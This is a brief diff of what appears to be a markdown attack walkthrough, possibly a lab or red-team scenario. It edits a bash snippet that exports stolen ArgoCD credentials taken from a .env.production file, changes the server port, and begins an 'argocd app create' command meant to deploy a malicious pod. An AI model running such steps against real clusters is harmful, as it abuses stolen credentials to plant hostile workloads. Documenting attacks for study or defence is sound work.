@@ -70,7 +70,7 @@ git push origin main
 ```bash
 # Using stolen ArgoCD credentials from .env.production
 export ARGOCD_AUTH_TOKEN=eyJhbGci...
-export ARGOCD_SERVER=argocd.sc.local:31443
+export ARGOCD_SERVER=argocd.sc.local:31080
 
 # Deploy malicious pod directly
 argocd app create malicious-cache \
